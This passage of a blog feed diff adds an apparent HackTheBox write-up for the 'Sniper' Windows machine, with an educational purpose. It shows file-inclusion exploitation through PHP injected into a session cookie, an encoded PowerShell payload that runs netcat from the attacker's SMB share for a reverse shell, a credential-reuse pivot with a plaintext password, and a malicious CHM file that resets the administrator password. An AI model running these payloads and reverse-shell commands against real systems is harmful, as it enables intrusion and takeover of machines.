@@ -1,4 +1,480 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-08-04T15:23:30+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="https://omnisl4sh.github.io/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/07/APT</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-08-05T19:38:46+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Sniper</title><link href="https://omnisl4sh.github.io/2022/08/05/Sniper.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Sniper" /><published>2022-08-05T00:00:00+02:00</published><updated>2022-08-05T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/08/05/Sniper</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/08/05/Sniper.html"><![CDATA[<p><img src="/assets/Sniper/Sniper.png" alt="Sniper" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>The box is a <strong>Windows</strong> machine <strong>hosting a PHP website</strong> which had both a <strong>LFI</strong> (intended) and <strong>RFI</strong> (unintended) vulnerabilities.</li>
+  <li><em>Down the LFI path, and after working around some</em> <strong>blacklisting</strong> <em>and</em> <strong>hardening</strong>, we manage to <strong>inject PHP code into the cookies</strong> and <strong>include them to gain RCE.</strong></li>
+  <li>We gain initial access as <code class="language-plaintext highlighter-rouge">NT Authority\iusr</code>. And, <em>as we are taking a look around the web root</em>, we find <strong>credentials</strong> for a local user called <code class="language-plaintext highlighter-rouge">chris</code> in the <strong>database settings file.</strong></li>
+  <li>We used <strong>PowerShell</strong> to gain <strong>another reverse shell</strong> as that user and started looking for ways to escalate our privileges.</li>
+  <li><em>In <code class="language-plaintext highlighter-rouge">chris</code>’s <code class="language-plaintext highlighter-rouge">Downloads</code> folder</em>, we found a file called <code class="language-plaintext highlighter-rouge">instructions.chm</code> which mentioned <strong>some documentation work to be delivered to the company’s CEO</strong>.</li>
+  <li><em>Also relevant to the same topic,</em> a folder called <code class="language-plaintext highlighter-rouge">Docs</code> in the root of the <code class="language-plaintext highlighter-rouge">C:</code> drive.</li>
+  <li>The folder contained a <strong>note for the developer</strong> (<code class="language-plaintext highlighter-rouge">chris</code>) from the CEO <strong>asking for the documentation to be dropped there</strong> when done.</li>
+  <li><em>To exploit the situation</em>, we create a <strong>malicious .CHM file</strong> using the <strong>Nishang PowerShell Suite</strong> to <strong>execute commands</strong> if that file was opened.</li>
+  <li><em>After placing the file in the <code class="language-plaintext highlighter-rouge">Docs</code> folder</em>, a few moments pass and the file gets removed. We verify execution of our payload (resetting the <code class="language-plaintext highlighter-rouge">administrator</code>’s password) by logging in and we’re authenticated successfully.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">NMAP</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Sniper Co.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-08-03T22:05:26
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_clock-skew: 6h59m59s
+</code></pre></div></div>
+
+<p>Nmap gives a few things to check:</p>
+<ol>
+  <li>Port 80</li>
+  <li><strong>RPC</strong> on port 135</li>
+  <li><strong>SMB</strong> on port 445</li>
+</ol>
+
+<p>We start with <strong>SMB</strong> and <strong>RPC</strong> since they are a quick check.</p>
+
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>we check the usual null, anonymous and guest authentication with <code class="language-plaintext highlighter-rouge">crackmapexec</code> but don’t get much past the <strong>OS</strong> and the <strong>hostname</strong>.
+<img src="/assets/Sniper/SMB-Enum.jpg" alt="SMB-Enum" /></p>
+
+<h3 id="rpc-enumeration">RPC Enumeration</h3>
+<p>we use <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> but don’t get much information here either</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> sniper
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation           
+                                                                                                                                                                                                                                    
+ ==========================  
+|    Target Information    |                                                                                                                                                                                                        
+ ==========================                              
+[*] Target ........... sniper                            
+[*] Username ......... ''                                                                                                                                                                                                           
+[*] Random Username .. 'stnvbvxv'                                                                                 
+[*] Password ......... ''                                                                                                                                                                                                           
+[*] Timeout .......... 5 second(s)                       
+                                                                                                                  
+ ==============================                    
+|    Service Scan on sniper    |                                                                                  
+ ==============================                                                                                                                                                                                                     
+[*] Checking LDAP                                                                                                                                                                     
+[-] Could not connect to LDAP on 389/tcp: timed out                                                                               
+[*] Checking LDAPS                                                                                                                
+[-] Could not connect to LDAPS on 636/tcp: timed out     
+[*] Checking SMB                                                                                                  
+[+] SMB is accessible on 445/tcp                       
+[*] Checking SMB over NetBIOS                         
+[+] SMB over NetBIOS is accessible on 139/tcp                                                                                     
+                                                                                                                  
+ ==============================================          
+|    NetBIOS Names and Workgroup for sniper    |                 
+ ==============================================
+[-] Could not get NetBIOS names information via 'nmblookup': timed out                                                                                  
+                                                                                                                                                        
+ ===================================                                                                              
+|    SMB Dialect Check on sniper    |                                                                                                                   
+ ===================================                                                                                                                    
+[*] Trying on 445/tcp                                                                                             
+[+] Supported dialects and settings:                                                                              
+SMB 1.0: false                                                                                                                                                                        
+SMB 2.02: true                                                                                                                    
+SMB 2.1: true                                                                                                                     
+SMB 3.0: true                                                                                                                                                                         
+SMB1 only: false                                         
+Preferred dialect: SMB 3.0                            
+SMB signing required: false                            
+                                                                                                                  
+ ===================================                                                                                                                                                  
+|    RPC Session Check on sniper    |                    
+ ===================================                                                                              
+[*] Check for null session                                                                                        
+[-] Could not establish null session: STATUS_ACCESS_DENIED                                                                                              
+[*] Check for random user session                                                                                                 
+[-] Could not establish random user session: STATUS_INVALID_PARAMETER                                                                                   
+[-] Sessions failed, neither null nor user sessions were possible                                                                                       
+                                                                                                                                                        
+ =====================================================           
+|    Domain Information via SMB session for sniper    |                                                                                                                               
+ =====================================================                      
+[*] Enumerating via unauthenticated SMB session on 445/tcp                                                                                              
+[+] Found domain information via SMB                                                                                                                                                  
+NetBIOS computer name: SNIPER                                                                                                                                                         
+NetBIOS domain name: ''                                                     
+DNS domain: Sniper                                                          
+FQDN: Sniper                                                                
+                                                                                                                  
+ =========================================                                                                                                              
+|    OS Information via RPC for sniper    |                                                
+ =========================================                                                                        
+[*] Enumerating via unauthenticated SMB session on 445/tcp                                  
+[+] Found OS information via SMB                                            
+[*] Enumerating via 'srvinfo'                                               
+[-] Skipping 'srvinfo' run, null or user session required                                                                                                                             
+[+] After merging OS information we have the following result:                                                    
+OS: Windows 10, Windows Server 2019, Windows Server 2016                                   
+OS version: '10.0'                                                                                                
+OS release: '1809'                                                                         
+OS build: '17763'                                                                          
+Native OS: not supported                                                                                          
+Native LAN manager: not supported                                                                                                                       
+Platform id: null                                                                                                 
+Server type: null                                                                                                                                       
+Server type string: null                                                                                          
+
+[!] Aborting remainder of tests since sessions failed, rerun with valid credentials                               
+                                                                                                                  
+Completed after 19.76 seconds 
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><em>On port 80,</em> we find a website
+<img src="/assets/Sniper/website.jpg" alt="website" /></p>
+
+<p>We get a <strong>login and registration form</strong> when we click the <strong>“User Portal”</strong><br />
+<img src="/assets/Sniper/login-page.jpg" alt="login-page" /></p>
+
+<p><img src="/assets/Sniper/register-page.jpg" alt="register-page" /></p>
+
+<p>We run <code class="language-plaintext highlighter-rouge">sqlmap</code> on both forms but don’t find any <strong>SQL injection</strong> :/</p>
+
+<h3 id="finding-a-file-inclusion-vulnerability">Finding a File Inclusion Vulnerability</h3>
+<p><em>However, when we go to the</em> <strong>services page</strong> <em>and check the</em> <strong>url for the language</strong> <em>in the dropdown menu,</em> we notice something interesting:</p>
+
+<p><img src="/assets/Sniper/spotting-lfi-param.jpg" alt="spotting-lfi-param" /></p>
+
+<p>The <strong>lang</strong> parameter takes a <code class="language-plaintext highlighter-rouge">.php</code> file name. This looks like a <strong>file inclusion vulnerability.</strong></p>
+
+<p><em>To verify it,</em> we first try to <strong>include a file we’re 100% sure exists.</strong></p>
+
+<p>so we choose a <strong>CSS</strong> file from the <strong>source code</strong> of that page.</p>
+
+<p><img src="/assets/Sniper/verifying-lfi.jpg" alt="verifying-lfi" /></p>
+
+<p>and try including it</p>
+
+<p><img src="/assets/Sniper/lfi-verified.jpg" alt="lfi-verified" /></p>
+
+<p><strong>We have verified a Local File Inclusion here.</strong></p>
+
+<p><em>In order to gain</em> <strong>RCE</strong> <em>from this,</em> we have a challenge to:</p>
+<ol>
+  <li>Find a file where we can <strong>inject PHP code</strong></li>
+  <li>Be able to <strong>reference it through the vulnerability to get code execution</strong></li>
+</ol>
+
+<h3 id="targeting-cookies">Targeting Cookies</h3>
+<p><strong>Cookies</strong> are a good place to start because:</p>
+<ul>
+  <li><strong>PHP stores the username inside them</strong> &amp; <strong>we have the ability to register users</strong></li>
+  <li><em>Also, In Windows, by default,</em> they are kept in a <em>likely accessible</em> directory <code class="language-plaintext highlighter-rouge">"c:\windows\temp"</code></li>
+  <li>Their file name has a known format: <code class="language-plaintext highlighter-rouge">"sess_&lt;PHP_SESSID_COOKIE_VALUE&gt;"</code></li>
+</ul>
+
+<p>So we need to:</p>
+<ol>
+  <li>Be able to <strong>write PHP code</strong> into the <strong>username field</strong> in the <strong>registration form</strong></li>
+  <li><strong>Login with that username</strong> and <strong>get a cookie</strong></li>
+  <li><strong>Reference that cookie file</strong> <em>using the</em> <strong>LFI vulnerability we found</strong></li>
+</ol>
+
+<p>Sounds like a lot … and it is a lot XD</p>
+
+<h3 id="user-registration">User Registration</h3>
+<p>We do a <strong>quick registration attempt</strong> to <strong>find out the limitations in user creation</strong>.</p>
+
+<p>We used:</p>
+<ul>
+  <li><strong>Email:</strong> <code class="language-plaintext highlighter-rouge">"a@a"</code></li>
+  <li><strong>Username:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
+  <li><strong>Password:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
+</ul>
+
+<p>This use has a special type of security. No one could ever guess creds like these :D :D :D</p>
+
+<p><em>Jokes aside,</em> here are the <strong>requests and responses for the registration and login</strong>.</p>
+
+<p>the response we got was a <strong>302 redirection to the initial login page</strong></p>
+
+<p><img src="/assets/Sniper/registratio-initial-request.jpg" alt="registratio-initial-request" /></p>
+
+<p><em>When trying to login,</em> we get a <strong>302 redirect followed by a 200 OK</strong></p>
+
+<p><img src="/assets/Sniper/login-success-redirect.jpg" alt="login-success-redirect" /></p>
+
+<p><img src="/assets/Sniper/login-success-response.jpg" alt="login-success-response" /></p>
+
+<p><em>After logging in,</em> the page looked like this:</p>
+
+<p><img src="/assets/Sniper/login-success.jpg" alt="login-success" /></p>
+
+<h3 id="including-the-cookie">Including the cookie</h3>
+<p><em>Before going further,</em> we need to <strong>confirm we can reference the cookie on disk</strong>.</p>
+
+<p>we can get the cookie from the <strong>Firefox developer tools.</strong></p>
+
+<p><img src="/assets/Sniper/getting-cookies.jpg" alt="getting-cookies" /></p>
+
+<p>We first try the <strong>full path</strong> to the cookie: <code class="language-plaintext highlighter-rouge">"c:\windows\temp\sess_bbv0f4mgcubtrvp548rvg62uui"</code></p>
+
+<p>But that doesn’t work and we <strong>get an error page</strong></p>
+
+<p><img src="/assets/Sniper/lfi-no-full-path.jpg" alt="lfi-no-full-path" /></p>
+
+<p><em>After many many tries:</em></p>
+<ul>
+  <li><strong>Normal traversal sequences</strong> like <code class="language-plaintext highlighter-rouge">../../</code></li>
+  <li><strong>Nested</strong> ones such as <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
+  <li><strong>Single</strong> and <strong>Double URL encoding</strong></li>
+  <li>and other techniques..</li>
+</ul>
+
+<p>I found out that I could include the cookie like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/windows/temp/sess_bbv0f4mgcubtrvp548rvg62uui
+</code></pre></div></div>
+
+<p><img src="/assets/Sniper/lfi-abs-path-success.jpg" alt="lfi-abs-path-success" /></p>
+
+<p>That’s because the <strong>PHP</strong> code is likely:</p>
+<ol>
+  <li><strong>Not accepting</strong> any <code class="language-plaintext highlighter-rouge">..</code> sequences</li>
+  <li><strong>Not accepting</strong> <code class="language-plaintext highlighter-rouge">c:</code> in the request</li>
+  <li><strong>Doesn’t like the path</strong> when it’s missing a <code class="language-plaintext highlighter-rouge">/</code> or <code class="language-plaintext highlighter-rouge">\</code> in the beggining</li>
+  <li><strong>But is alright with specifying the path without the</strong> <code class="language-plaintext highlighter-rouge">c:</code> <strong>part</strong></li>
+</ol>
+
+<p>We now know that <strong>we can include the input of the username field into the HTML.</strong></p>
+
+<p>So we move on to the next step.</p>
+
+<h3 id="finding-the-allowed-special-characters">Finding the allowed special characters</h3>
+<p>We’re going to <strong>brute force all the special characters</strong> at the <strong>registration form</strong> using <strong>Burp</strong> and find out what’s allowed and what’s not.</p>
+
+<p>I <strong>searched for a way to get all the special characters</strong> and found one using <code class="language-plaintext highlighter-rouge">python</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">)</span>
+</code></pre></div></div>
+<p><img src="/assets/Sniper/special-chars-using-python.jpg" alt="special-chars-using-python" /></p>
+
+<p>we’re going to <strong>use those as payloads</strong> with <strong>Burp Intruder’s Sniper attack type</strong>. <em>Sniper :D</em></p>
+
+<p><img src="/assets/Sniper/registration-brute-1.jpg" alt="registration-brute-1" /></p>
+
+<p><img src="/assets/Sniper/registration-brute-2.jpg" alt="registration-brute-2" /></p>
+
+<p><em>after launching the attack,</em> we notice that <strong>we get a 302 response with all requests (32 total) and with a fixed length of 292</strong></p>
+
+<p><img src="/assets/Sniper/registration-brute-3.jpg" alt="registration-brute-3" /></p>
+
+<p><strong>are ALL special characters allowed?</strong></p>
+
+<p><em>if true,</em> we would <strong>want to verify that.</strong></p>
+
+<p><em>otherwise,</em> we would get ourselves into a <strong>blind, mindless and merciless loop of trial-and-error.</strong></p>
+
+<p>We’re going to do <strong>the same brute force attack with the login form</strong> to <strong>see which ones would log in and -by extension- give us cookies that we can include</strong></p>
+
+<p><img src="/assets/Sniper/login-brute-1.jpg" alt="login-brute-1" /></p>
+
+<p><img src="/assets/Sniper/login-brute-2.jpg" alt="login-brute-2" /></p>
+
+<p>the results show that <strong>there were -in fact- blacklisted characters</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" $ &amp; ( - . ; [ \ _
+</code></pre></div></div>
+<p>and the allowed ones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>! # % ' ) * + , / : &lt; = &gt; ? @ ] ^ ` { | } ~
+</code></pre></div></div>
+
+<p>this is good! Because:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> are the <strong>tags</strong> needed to <strong>inject PHP</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">?</code> is used in the declaration</li>
+  <li>and the <strong>backtick</strong> can be used for <strong>code execution</strong> (<em>just like in</em> <strong>Bash</strong>)</li>
+</ul>
+
+<p>we can craft a <strong>payload</strong> like this:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="sb">`whoami`</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><em>after logging in,</em> we get the cookie value from the browser and are able to get <strong>code execution.</strong></p>
+
+<p><img src="/assets/Sniper/rce-achieved.jpg" alt="rce-achieved" /></p>
+
+<p><em>with RCE achieved,</em> we have to find a way to <strong>execute a reverse shell with the allowed characters we have.</strong></p>
+
+<p><strong>We have a couple of challenges here:</strong></p>
+<ul>
+  <li>the <strong>dollar sign</strong> (<code class="language-plaintext highlighter-rouge">$</code>), the <strong>brackets</strong> <code class="language-plaintext highlighter-rouge">(</code> and <code class="language-plaintext highlighter-rouge">[</code> along with the <strong>underscore</strong> (<code class="language-plaintext highlighter-rouge">_</code>) are blocked, which enable the standard <strong>PHP backdoor</strong> <code class="language-plaintext highlighter-rouge">&lt;?php exec($_REQUEST["cmd"]);?&gt;</code></li>
+  <li><em>also,</em> the <strong>dot</strong> (<code class="language-plaintext highlighter-rouge">.</code>) is blocked, so we can’t use our <strong>ip address</strong> in the payload to download something by either HTTP or SMB</li>
+  <li><em>And, with the</em> <strong>backslash</strong> <code class="language-plaintext highlighter-rouge">\</code> <em>blocked as well,</em> it means <strong>writing to paths other that the current directory isn’t allowed</strong></li>
+</ul>
+
+<p><em>when thinking about using</em> <strong>PowerShell</strong> <em>in execution,</em> I remembered that we could use the encoded switch <code class="language-plaintext highlighter-rouge">-E</code> and pass <strong>base64-encoded commands.</strong></p>
+
+<p>This <strong>feature</strong> was <em>initially built</em> to <strong>make handling tricky sequences of special characters easier.</strong></p>
+
+<p><em>Even though the dash</em> (<code class="language-plaintext highlighter-rouge">-</code>) <em>is blocked</em>, this trick is still accessible with the <em>whitelisted</em> <strong>forward slash</strong> (<code class="language-plaintext highlighter-rouge">/</code>).</p>
+
+<p>This is similar to <strong>regular windows commands</strong> (ex: <code class="language-plaintext highlighter-rouge">ipconfig /all</code>)</p>
+
+<p>we test out a simple <strong>PowerShell</strong> command <code class="language-plaintext highlighter-rouge">get-date</code></p>
+
+<p><img src="/assets/Sniper/powershell-encoding.jpg" alt="powershell-encoding" /></p>
+
+<p>notice the encoding type is <strong>UTF-16LE</strong>. That’s what PowerShell accepts when using that parameter.</p>
+
+<p><img src="/assets/Sniper/powershell-encoded-execution.jpg" alt="powershell-encoded-execution" /></p>
+
+<p><em>After verifying that this method works, and after failing with many reverse shell options,</em> I set up an <strong>Impacket SMB Server</strong> and hosted <code class="language-plaintext highlighter-rouge">netcat</code> (the 64-bit version) and <strong>managed to get code execution with this payload</strong>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="sb">`powershell /e XABcADEAMAAuADEAMAAuADEANgAuADMAXABzAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANgAuADMAIAA5ADAAMAAwAA==`</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>which is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.16.3\s\nc64.exe -e powershell 10.10.16.3 9000
+</code></pre></div></div>
+
+<p><em>thankfully, after all this hard work,</em> we’re rewarded with a <strong>sweeet reverse shell :D</strong></p>
+
+<p><img src="/assets/Sniper/shell-as-iusr.jpg" alt="shell-as-iusr" /></p>
+
+<h3 id="finding-creds-in-the-database-settings-file-like-always">Finding creds in the database settings file (like always)</h3>
+<p><em>The first I did after getting the shell,</em> was <strong>check the files in the web root.</strong></p>
+
+<p>I find a file called <code class="language-plaintext highlighter-rouge">db.php</code> in the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user</code> directory.</p>
+
+<p><strong>The contents were:</strong></p>
+
+<p><img src="/assets/Sniper/creds-in-db-php.jpg" alt="creds-in-db-php" /></p>
+
+<p>I check the users on the system with <code class="language-plaintext highlighter-rouge">net user</code> to <strong>get a list of usernames to reuse the password with</strong></p>
+
+<p><img src="/assets/Sniper/local-users.jpg" alt="local-users" /></p>
+
+<p>The password works for <code class="language-plaintext highlighter-rouge">chris</code></p>
+
+<p><img src="/assets/Sniper/got-chris.jpg" alt="got-chris" /></p>
+
+<h3 id="getting-a-shell-as-chris">Getting a shell as Chris</h3>
+<p>The situation is that we want to pivot to the <code class="language-plaintext highlighter-rouge">chris</code> user <strong>without losing the shell</strong> (<em>that we worked so hard for XD</em>)</p>
+
+<p>We can do so from our <strong>PowerShell</strong> reverse shell using the below method:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"Sniper\chris"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">))</span><span class="w">
+</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">\\10.10.16.3\s\nc64.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nx">10.10.16.3</span><span class="w"> </span><span class="nx">9001</span><span class="p">}</span><span class="w"> </span><span class="nt">-AsJob</span><span class="w">
+</span></code></pre></div></div>
+
+<p>we’re basically <strong>creating a</strong> <code class="language-plaintext highlighter-rouge">credential</code> <strong>object</strong> for the <code class="language-plaintext highlighter-rouge">chris</code> user and <strong>invoking a local script as him</strong> but <em>as a job</em> to <strong>fork into a new process</strong> and <strong>leave our shell in tact.</strong></p>
+
+<p><img src="/assets/Sniper/shell-as-chris.jpg" alt="shell-as-chris" /></p>
+
+<p>Sweet :D</p>
+
+<h3 id="privilege-escalation-scanning-the-file-system">Privilege Escalation: Scanning the file system</h3>
+<p><em>When checking the folders in chris’s user profile,</em> we find a file called <code class="language-plaintext highlighter-rouge">intructions.chm</code> in his <code class="language-plaintext highlighter-rouge">Downloads</code> folder.</p>
+
+<p>We <strong>copy it over to our Kali using the SMB share.</strong></p>
+
+<p><img src="/assets/Sniper/found-chm-file.jpg" alt="found-chm-file" /></p>
+
+<p><em>When we open the file,</em> we get the <strong>content</strong> below:</p>
+
+<p><img src="/assets/Sniper/chm-file-contents.jpg" alt="chm-file-contents" /></p>
+
+<p><strong>This is information on the internal operations here:</strong></p>
+<ul>
+  <li>There’s <strong>a project of an android app</strong> <em>in development</em></li>
+  <li><strong>That document</strong> looks like <strong>a draft for its documentation</strong></li>
+</ul>
+
+<p><em>other than that, according to the text,</em> it seems like the chris guy is really stressed out and thinking about quitting the his job because the CEO is overloading him with work.</p>
+
+<p>We don’t know if this information would be handy or not. But we take note of it and move on.</p>
+
+<p><em>In the system root</em> (<code class="language-plaintext highlighter-rouge">c:\</code>), we find a folder that <strong>sticks out:</strong> <code class="language-plaintext highlighter-rouge">Docs</code></p>
+
+<p><em>Looking at its contents,</em> we see a <code class="language-plaintext highlighter-rouge">note.txt</code> file:</p>
+
+<p><img src="/assets/Sniper/docs-and-note-txt.jpg" alt="docs-and-note-txt" /></p>
+
+<p><em>Apart from the CEO bullying the chris guy,</em><br />
+<em>and even leaving him a copy of</em> <code class="language-plaintext highlighter-rouge">"php for dummies-trial.pdf"</code> <em>as further insult,</em></p>
+
+<ul>
+  <li>he is <strong>asking about the documentation for the new app</strong> (<em>very possibly referring to the android project in development</em>).</li>
+  <li>and <strong>wants him to drop it into this folder</strong> <code class="language-plaintext highlighter-rouge">"c:\Docs"</code> once done.</li>
+</ul>
+
+<p>Sounds like we need to <strong>create a malicious</strong> <code class="language-plaintext highlighter-rouge">.chm</code> file and put it there.</p>
+
+<p><em>if the CEO happens to be the local <code class="language-plaintext highlighter-rouge">administrator</code> and opens the file,</em> we should root the box.</p>
+
+<h3 id="malicious-chm-files-for-the-win">Malicious CHM files For The Win</h3>
+<p><em>Searching</em> <strong>Google</strong>, we come accross this <a href="/assets/Sniper/https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">blog</a> explaining exactly <strong>how to execute a payload using a <code class="language-plaintext highlighter-rouge">.chm</code> file</strong> using a script from the <strong>Nishang script suite.</strong></p>
+
+<p><em>Following the article,</em> we download the <strong>“HTML Help Workshop and Documentation program”</strong> and <strong>get the script</strong> from the <a href="/assets/Sniper/https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Github Repository</a>.</p>
+
+<p>We <strong>import</strong> the <code class="language-plaintext highlighter-rouge">Out-CHM.ps1</code> file and use it to get a <code class="language-plaintext highlighter-rouge">doc.chm</code> file</p>
+
+<p><img src="/assets/Sniper/generating-chm.jpg" alt="generating-chm" /></p>
+
+<p><em>After copying it to the <code class="language-plaintext highlighter-rouge">Docs</code> folder and waiting a few moments,</em> The <code class="language-plaintext highlighter-rouge">.chm</code> file <strong>gets executed</strong>. and <strong>the Administrator’s password is changed</strong></p>
+
+<p>We confirmed with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
+
+<p><img src="/assets/Sniper/got-admin.jpg" alt="got-admin" /></p>
+
+<p><strong>Pretty fun box :]</strong></p>
+
+<h3 id="unintended-path-rfi-though-smb">Unintended Path: RFI though SMB</h3>
+<p><em>When checking the ability of adding network paths as the file inclusion payload,</em> we got <strong>PHP code execution:</strong></p>
+
+<p><img src="/assets/Sniper/rfi-php-info.jpg" alt="rfi-php-info" /></p>
+
+<p>This path is <strong>much easier</strong> but also <strong>teaches way less than the LFI one.</strong></p>
+
+<h3 id="out-of-curiousity-a-look-at-the-php-within-the-blog-directorys-indexphp">Out of Curiousity: A look at the PHP within the blog directory’s <code class="language-plaintext highlighter-rouge">index.php</code></h3>
+<p><img src="/assets/Sniper/lfi-hardening.jpg" alt="lfi-hardening" /></p>
+
+<p>in <code class="language-plaintext highlighter-rouge">index.php</code>, we the code <strong>looks for <code class="language-plaintext highlighter-rouge">..</code> and <code class="language-plaintext highlighter-rouge">C:</code> within the included file path</strong> and <strong>throws an error if it detects any.</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'header.html'</span><span class="p">;</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"php"</span><span class="p">);</span>
+<span class="nb">stream_wrapper_unregister</span><span class="p">(</span><span class="s2">"data"</span><span class="p">);</span> 
+<span class="nv">$lang</span> <span class="o">=</span> <span class="s2">"blog-en.php"</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">ISSET</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">include</span> <span class="nv">$lang</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$lang</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">".."</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$lang</span><span class="p">,</span> <span class="s2">"C:"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Hardened 8)</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">include</span> <span class="nv">$lang</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">include</span> <span class="s2">"error.html"</span><span class="p">;</span>
+        <span class="k">die</span><span class="p">();</span>
+    <span class="p">}</span> 
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
